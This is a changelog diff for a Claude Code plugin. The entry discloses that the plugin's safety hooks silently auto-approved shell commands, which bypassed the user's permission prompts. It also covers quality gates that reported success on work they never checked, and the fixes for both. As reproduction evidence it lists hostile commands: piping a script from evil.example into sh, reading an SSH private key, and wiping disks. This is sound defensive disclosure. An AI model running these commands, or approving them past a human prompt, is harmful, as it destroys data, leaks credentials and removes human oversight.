@@ -1,5 +1,246 @@
 # Changelog
 
+## 6.1.0 — 2026-08-13
+
+**Please update. Every earlier version reduced the safety of the machine it was
+installed on, in a way this project never intended and never disclosed. Two
+critical defects are fixed here, along with nine more that let a gate report
+success on work it had not actually checked.**
+
+*(A 6.0.4 carrying only the first fix was prepared and never released; its
+contents are included below rather than claiming a version that never shipped.)*
+
+### The plugin was switching off your permission prompts
+
+Claude Code normally asks before running a shell command it judges risky. A
+`PreToolUse` hook can answer that question on your behalf, and the answer this
+plugin gave was the wrong one.
+
+Both safety hooks ended every check they had no objection to by emitting
+`permissionDecision: "allow"`. Per Claude Code's own documented contract, that
+value means *"permit the tool call to proceed without a permission prompt"* — it
+does not mean "I have no opinion". The neutral answer is to say nothing at all.
+
+So for every shell command that was not a code push, this plugin actively
+approved it and suppressed the prompt you would otherwise have seen. Reproduced
+against real commands before fixing:
+
+```
+rm -rf /important                      -> allow
+curl http://evil.example/x.sh | sh     -> allow
+cat ~/.ssh/id_rsa                      -> allow
+chmod -R 777 /                         -> allow
+dd if=/dev/zero of=/dev/sda            -> allow
+```
+
+A tool installed to make a setup safer was making it less safe. In the language
+of the OWASP Top 10 for LLM Applications (2025), this is LLM06 Excessive Agency:
+the component held far more authority than its job required. These hooks have a
+legitimate basis to **refuse** a push. They never had a basis to **approve**
+anything else.
+
+**What changed.** The single ambiguous function is now two, so that no approval
+can ever again be a side effect of saying nothing:
+
+- **Step aside** — emit no decision at all. Used wherever a hook has no business
+  interfering: the command is not a push, or the folder is not a studio project,
+  or (for the secret scanner) nothing was found. Your normal permission prompts
+  return, exactly as they behave without this plugin installed.
+- **Authorise** — emit an approval, with a stated reason. Reserved for the two
+  paths where you confirmed the action moments earlier and a project-bound,
+  expiring record proves it. Nothing else in the plugin may call it.
+
+The secret scanner is now explicitly veto-only: finding no secrets means it has
+no objection, which was never the same thing as approving your push.
+
+**What did not change.** An unauthorised push is still refused. A confirmed push
+is still allowed. A private-publish record still cannot make a repository public.
+All of that is asserted by tests that were run before and after the change.
+
+### A stalled hook can no longer hang for ten minutes
+
+Every hook now declares an explicit 20-second limit. Without one the platform
+default of 600 seconds applied, and a hook that times out does not block the
+command — so a stall was both a frozen session and a window with this plugin's
+protection absent. The bound was chosen from measurement, not guesswork: the
+scanner takes 147–156 ms against this repository and the gate 56–57 ms, and a
+test now asserts that margin stays wide as the code grows.
+
+### How this is prevented from coming back
+
+A new repository invariant (INV17) fails the build if any hook emits a blanket
+approval, if the old combined function reappears, or if the secret scanner ever
+starts authorising. It was verified by deliberately reintroducing each of those
+three regressions and confirming each one is caught.
+
+Three regression tests were added, and 23 existing tests were corrected: they had
+been asserting the defective behaviour, which is why nine earlier audit rounds
+did not catch it. Test count is reported once, at the end of this entry.
+
+### Credit
+
+Found in an independent peer review of the 6.0.3 source. It had survived twelve
+of this project's own audit rounds, because every round asked whether the studio
+kept its own promises — and this was a promise nobody had made.
+
+---
+
+### The quality gate read only the first table in its file
+
+This is the second critical defect, and it is the one that mattered most to
+anyone actually using the studio.
+
+`QUALITY-GATE.md` records the Definition of Done for the current phase. The gate
+that reads it — the gate that authorises per-phase backups and publishing — found
+the first markdown table, checked it, and stopped. Every later table was
+invisible.
+
+That is precisely the shape a real project produces. `Dev-Memory`'s own
+discipline is append, never rewrite. So a project that finished Phase 1, appended
+Phase 2's Definition of Done below it, and started work got:
+
+```
+| Automated tests | fail | `npm test` -> exit 1, 3 failing |     <- the live table
+...
+{"status":"clean"}                                               <- the gate's verdict
+```
+
+A green light while its own record said the tests were failing. The gate's own
+header promises that "every ambiguous state fails CLOSED".
+
+Every table is now checked, and a failure anywhere blocks. A 2026-07-19 fix had
+introduced the first-table-only behaviour for a real reason — an unrelated
+Item+Status table elsewhere in the file could inject a spurious row. That case is
+still supported, but it must now be **declared** with an explicit
+`<!-- not-a-definition-of-done -->` marker above the table rather than guessed at.
+An earlier attempt guessed, using a coverage heuristic, and that reopened this very
+defect for narrow tables — see the review section at the end of this entry.
+
+### The same defect in the content gate
+
+`content-check.mjs` also read only its first asset table. Grouping the content
+register by medium — `## Images`, then `## Audio`, then `## Text` — is the obvious
+way to organise it, and it hid every asset after the first group. An unapproved,
+unattributed image with no alt-text sat in a second table and the gate reported
+`{"status":"clean","assets":2}`. It counted the asset and cleared it.
+
+### Gates that declared files fine without reading them
+
+Three gates returned the same value for "this file isn't there" and "this file is
+there but I couldn't read it", and treated both as "nothing to check":
+
+- `memory-integrity.mjs` reported "recall index and knowledge graph are
+  internally consistent" about an `INDEX.md` that was unreadable, and about one
+  that had been replaced by a directory.
+- `traceability-check.mjs` treated an unreadable `REQUIREMENTS.md` as an absent
+  one — and on a Tiny-Tier project, absent is the *lenient* path. It reported
+  "Nothing to trace" about a file it had not read a byte of.
+
+`content-check.mjs` had already found and fixed this exact class in July, and
+stated the principle: *a gate that cannot read its input must never claim its
+input is fine*. That fix is now shared code, so the same bug cannot be made a
+sixth time.
+
+### "Unverified" counted as proof; "exit code 0" did not
+
+Two defects in one pattern, pulling opposite ways.
+
+A task marked done was accepted with evidence reading
+`unverified: npm test -> exit 0 is what we expect once someone runs it`. The
+pattern looked for `verified:` with no left-hand boundary, so it matched the
+`verified:` inside `unverified:`. Evidence stating in plain English that nobody
+had run the test was accepted as proof.
+
+Meanwhile a genuinely passing task recorded as `-> exit code 0` was **rejected**.
+The failure side of the same check had been widened years earlier to accept
+`exit code N`, described in this codebase as "the far more natural phrasing". The
+success side never was. So the project recognised "exit code 1" as a failure claim
+but not "exit code 0" as a success claim.
+
+A progress file containing no table at all also passed, with the reason
+"every done row has a verified: cell" — a claim about rows it had never found.
+
+### Smaller fixes in the same sweep
+
+- A licence scan beside an **empty** `node_modules` reported "checked" and clean.
+  Declared dependencies are now cross-checked against what is actually installed;
+  anything missing makes the result honestly incomplete.
+- A manifest with a blank version string was skipped rather than failed, even
+  though a manifest with no version publishes nothing.
+- A raw `|` inside an evidence cell shifted every later column and hid a recorded
+  failure. Rows whose columns do not line up with their header are now reported
+  instead of skipped.
+- Pipe-less markdown tables — valid, and rendering identically on GitHub — were
+  invisible to the quality and content gates, which then reported "no table found"
+  about files that plainly had one. Two further gates (`memory-integrity`,
+  `traceability-check`) still require a leading pipe; they fail closed on such a
+  table, so it is a false block rather than a false pass, and it is not yet fixed.
+- A note in a project's own memory pointing at a sibling file by name was wrongly
+  reported as a broken reference. This gate blocked that three times in a single
+  session, once on a note whose only content was a description of the bug.
+
+### How these were fixed, and why that matters more than the fixes
+
+Every one of the twelve was reproduced first, as a committed script that asserts
+the *defective* behaviour, and only then fixed. The script then had to flip. Both
+directions run in the test suite, so a reproduction cannot quietly decay into a
+test that passes anything.
+
+Alongside every fix, the unmutated reference fixture had to stay clean. Without
+that control, "make every gate block" would have scored as a perfect result.
+
+One false positive was introduced during this work and caught the same way: a
+newly added contradiction term blocked a legitimately green row whose note
+mentioned "the researcher's unverified inference" — prose about someone else's
+claim, not a statement about that task. The term was narrowed the same day. It is
+recorded here because a gate that cries wolf gets routed around, which is how a
+gate stops being worth having.
+
+### An independent review found two of the fixes had opened new holes
+
+Before this release, the whole change set went to an independent reviewer — a
+reader who had not written any of it. That mattered more than any single fix in
+it, and the honest record is worth publishing rather than hiding.
+
+The reviewer found **twelve** findings. Two were new fail-opens created by the
+fixes above:
+
+- The quality gate's replacement logic used a heuristic: a table counted only if
+  it covered at least three of the required dimensions. That reopened the very
+  critical defect it replaced, for any **narrow** table — and a narrow table is
+  what a phase in progress actually produces, because it lists only the
+  dimensions still outstanding. Being clever was worse than being blunt. Every
+  table now counts, and excluding one requires an explicit marker in the file.
+- The content gate started passing a **header-only** register — a table created
+  and never filled in — where the previous version correctly refused it.
+
+Three more were about the change that let this project push its own repository:
+the exemption was not actually bound to this plugin (an unrelated repository with
+a lookalike directory shipped private memory unflagged), it silently stopped
+working when a push ran from a subdirectory, and the `scan-allow` annotation was
+honoured at only one of five places it needed to be. The exemption is now anchored
+to this hook's own location on disk, so no path pattern can satisfy it by accident.
+
+The reviewer also found that a valid publish token blanket-approved anything
+appended to the push — `git push … && rm -rf …` was approved in full, because an
+approval covers the whole command string. Such commands now **escalate** to a
+permission prompt instead: the token still proves intent, but the extra work gets
+a human's eyes.
+
+Six smaller findings were fixed too, including two regex gaps that let
+`un-verified:` count as proof, a partial fix that any table switched off, a new
+false block on ordinary prose next to a table, and a licence scan that was
+permanently "incomplete" on any project with a platform-specific optional
+dependency.
+
+**Every one of the twelve is pinned by a reproduction that runs in both
+directions**, and each carries a control proving the fix did not simply switch the
+check off. Two of those reproductions were wrong on first writing — they passed
+for the wrong reason — and were caught by their own controls, which is the
+strongest argument for having them.
+
+Test count 460 → 468, all passing.
+
 ## 6.0.3 — 2026-08-11
 
 Two packaging fixes, both found by re-running the install verification against the
